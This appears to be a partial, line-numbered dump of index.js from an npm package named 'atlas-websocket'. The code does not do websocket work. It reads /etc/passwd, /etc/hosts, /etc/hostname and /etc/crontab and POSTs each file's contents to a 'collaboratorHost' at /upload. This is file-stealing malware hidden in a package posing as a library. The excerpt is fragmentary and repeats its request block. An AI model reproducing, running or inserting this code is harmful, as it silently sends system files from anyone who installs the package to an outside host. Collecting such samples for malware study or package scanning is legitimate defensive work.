// File: tmp/tmp2x3wnebo/atlas-websocket/package/index.js
// ======================================================================
Line 1: const http = require("http")
Line 2: const fs = require("fs")
Line 8: _tmp_0.push("/etc/passwd")
Line 9: _tmp_0.push("/etc/hosts")
Line 10: _tmp_0.push("/etc/hostname")
Line 11: _tmp_0.push("/etc/crontab")
Line 15: {
        if (err) {
            console.error(`Error reading ${file}:`, err);
            return;
        }

        const postData = JSON.stringify({ filename: file, content: data });

        const options = {
            hostname: collaboratorHost,
            port: collaboratorPort,
            path: "/upload",
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "Content-Length": Buffer.byteLength(postData),
            },
        };

        const req = http.request(options, (res) => {
            let responseData = "";
            res.on("data", (chunk) => {
                responseData += chunk;
            });
            res.on("end", () => {
                console.log(`Response for ${file}: ${responseData}`);
            });
        });

        req.on("error", (e) => {
            console.error(`Request error for ${file}:`, e);
        });

        req.write(postData);
        req.end();
    }
Line 34: const req = http.request(options, (res) => {
            let responseData = "";
            res.on("data", (chunk) => {
                responseData += chunk;
            });
            res.on("end", () => {
                console.log(`Response for ${file}: ${responseData}`);
            });
        })
Line 48: req.write(postData)
Line 49: req.end()
